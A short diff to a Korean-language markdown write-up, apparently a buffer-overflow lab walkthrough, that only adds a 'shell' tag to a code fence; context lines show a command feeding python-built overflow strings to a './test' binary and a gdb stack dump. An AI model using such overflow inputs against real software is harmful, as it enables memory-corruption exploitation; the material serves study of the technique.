@@ -63,7 +63,7 @@ argv[1]의 길이가 48로 제한되어 있음. 그래서 argv[2]를 이용해�
 ```
 ./test `python -c 'print "A"*44+"BBB\xbf"'` `python -c 'print "C"*44+"DDD\xbf"'`
 ``` 
-```
+```shell
 (gdb) x/100wx $esp
 0xbffffad0:     0x00000000      0xbffffb14      0xbffffb24      0x40013868
 0xbffffae0:     0x00000003      0x08048450      0x00000000      0x08048471
